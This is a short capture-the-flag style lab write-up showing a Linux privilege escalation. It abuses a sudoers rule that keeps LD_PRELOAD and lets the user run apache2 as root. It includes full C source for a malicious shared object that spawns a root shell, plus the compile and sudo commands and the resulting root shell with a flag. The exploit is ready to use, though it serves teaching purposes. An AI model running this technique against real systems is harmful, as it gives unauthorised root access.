So you've got a foothold on a regular user account on a Linux box? You've tried to escalate privileges to root but nothing seems to work? Remember the order in which programs, scripts and libraries load dictates what executes!

Check sudoers file

```
student@attackdefense:~$ sudo -l
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/sbin/apache2
```

We see that:

- student user can run apache2 as root without password
- `env_keep+=LD_PRELOAD` environment can be set

We leverage this by creating a program:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

And compile the program

```
student@attackdefense:~$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
student@attackdefense:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function '_init':
shell.c:6:1: warning: implicit declaration of function 'setgid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
 setgid(0);
 ^~~~~~
 setenv
shell.c:7:1: warning: implicit declaration of function 'setuid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
 setuid(0);
 ^~~~~~
 setenv
```

Use sudo to change value of `LD_PRELOAD` variable to path of shell.so and call the apache2 program - We get execution of hte code in the `_init()` function and launch an elevated shell

```
student@attackdefense:~$ sudo LD_PRELOAD=/home/student/shell.so apache2
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag
368b219937989a57d0c1191ac697cc83
```
